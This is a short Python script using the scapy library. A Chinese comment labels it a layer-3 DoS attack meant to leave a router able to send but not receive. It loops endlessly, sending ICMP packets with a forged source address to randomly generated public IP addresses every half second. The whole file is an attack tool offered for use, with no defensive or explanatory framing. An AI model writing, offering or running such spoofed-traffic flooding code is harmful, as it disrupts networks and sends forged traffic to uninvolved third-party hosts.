import time
from random import randint
from scapy.all import *


#  三层DOS攻击,路由器只出的去进不来
def main():
    while True:
        pdst = "%i.%i.%i.%i" %(randint(1, 254), randint(1, 254), randint(1, 254), randint(1, 254))
        psrc = "192.168.82.99"  # 这个随便写
        send(IP(src=psrc, dst=pdst)/ICMP())
        time.sleep(0.5)
        print(pdst)


if __name__ == '__main__':
    main()